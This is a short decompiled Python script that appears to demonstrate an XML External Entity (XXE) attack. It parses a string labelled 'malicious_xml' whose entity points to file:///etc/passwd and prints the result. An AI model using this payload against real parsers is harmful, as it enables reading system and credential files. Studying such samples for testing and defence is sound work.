# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 428_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 507 bytes
import xml.etree.ElementTree as ET

def parse_xml(xml_string):
    root = ET.fromstring(xml_string)
    return root


malicious_xml = '<?xml version="1.0"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>\n  <data>&xxe;</data>\n</root>'
try:
    result = parse_xml(malicious_xml)
    print(result.find("data").text)
except Exception as e:
    try:
        print(f"Error: {e}")
    finally:
        e = None
        del e

# okay decompiling 428_1.pyc
